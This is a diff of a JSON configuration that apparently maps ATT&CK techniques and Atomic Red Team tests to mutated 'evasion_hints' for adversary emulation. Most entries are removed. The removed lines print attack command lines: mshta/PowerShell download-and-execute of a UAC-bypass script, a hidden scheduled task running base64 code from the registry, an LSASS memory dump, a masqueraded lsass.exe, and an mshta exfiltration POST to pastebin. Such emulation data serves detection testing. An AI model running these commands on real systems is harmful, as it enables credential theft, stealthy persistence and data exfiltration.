@@ -1,115 +1,13 @@
 {
   "1": {
-    "T1059.001": {
-      "selected_test_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
-      "selected_test_name": "Invoke-AppPathBypass",
-      "evasion_hints": {
-        "ParentImage": "C:\\Windows\\System32\\mshta.exe",
-        "Image": "C:\\Windows\\System32\\powershell.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\",0)(window.close)",
-        "OriginalFileName": "mshta.exe"
-      },
-      "mutation_applied": true
-    },
-    "T1053.005": {
-      "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
-      "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\"WScript.Shell\\\"\").Run powershell.exe -NoProfile -WindowStyle Hidden -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test))),0\\\")\" /sc daily /st 14:30",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "TargetObject": "HKCU\\\\SOFTWARE\\\\ATOMIC-T1053.005\\\\test"
-      },
-      "mutation_applied": true
-    },
-    "T1036.005": {
-      "selected_test_guid": "35eb8d16-9820-4423-a2a1-90c4f5edd9ca",
-      "selected_test_name": "Masquerade as a built-in system executable",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\Temp\\lsass.exe",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "CommandLine": "C:\\Windows\\Temp\\lsass.exe",
-        "OriginalFileName": "lsass.exe"
-      },
-      "mutation_applied": true
-    },
-    "T1003.001": {
-      "selected_test_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
-      "selected_test_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
-      "evasion_hints": {
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
-        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
-        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\Public\\Documents\\diag /fullmemdmp /wait 1",
-        "OriginalFileName": "rdrleakdiag.exe"
-      },
-      "mutation_applied": true
-    },
-    "T1567.003": {
-      "selected_test_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
-      "selected_test_name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\mshta.exe",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\"MSXML2.XMLHTTP\").Open(\"POST\",\"https://pastebin.com/api/api_post.php\",False)(CreateObject(\"MSXML2.XMLHTTP\")).Send(\"api_dev_key=6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0&api_option=paste&api_paste_code=secrets,api keys,passwords...\")",
-        "OriginalFileName": "mshta.exe"
-      },
-      "mutation_applied": true
-    }
-  },
-  "2": {
-    "T1059.001": {
-      "selected_test_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
-      "selected_test_name": "Invoke-AppPathBypass",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\cmd.exe",
-        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden \"$client = New-Object System.Net.WebClient; $script = $client.DownloadData('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); $decoded = [System.Text.Encoding]::UTF8.GetString($script); & ([scriptblock]::Create($decoded)) -Payload 'C:\\Windows\\System32\\cmd.exe'\"",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "OriginalFileName": "powershell.exe"
-      },
-      "mutation_applied": true
-    },
-    "T1053.005": {
-      "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
-      "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\"WScript.Shell\\\"\").Run powershell.exe -NoProfile -WindowStyle Hidden -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test))),0\\\")\" /sc daily /st 14:30",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "TargetObject": "HKCU\\\\SOFTWARE\\\\ATOMIC-T1053.005\\\\test"
-      },
-      "mutation_applied": true
-    },
     "T1036.005": {
       "selected_test_guid": "03ae82a6-9fa0-465b-91df-124d8ca5c4e8",
       "selected_test_name": "Masquerading cmd.exe as VEDetector.exe",
       "evasion_hints": {
         "Image": "C:\\Users\\Public\\Downloads\\VEDetector.exe",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "ParentImage": "C:\\Windows\\System32\\powershell.exe",
         "CommandLine": "C:\\Users\\Public\\Downloads\\VEDetector.exe",
         "OriginalFileName": "cmd.exe"
-      },
-      "mutation_applied": true
-    },
-    "T1003.001": {
-      "selected_test_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
-      "selected_test_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
-      "evasion_hints": {
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
-        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\Public\\Documents\\diag /fullmemdmp /wait 1",
-        "OriginalFileName": "rdrleakdiag.exe"
-      },
-      "mutation_applied": true
-    },
-    "T1567.003": {
-      "selected_test_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
-      "selected_test_name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\mshta.exe",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\"MSXML2.XMLHTTP\").Open(\"POST\",\"https://pastebin.com/api/api_post.php\",0)(CreateObject(\"MSXML2.XMLHTTP\").Send(\"api_dev_key=6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0&api_option=paste&api_paste_code=secrets,api keys,passwords...\"))",
-        "OriginalFileName": "mshta.exe"
       },
       "mutation_applied": true
     }
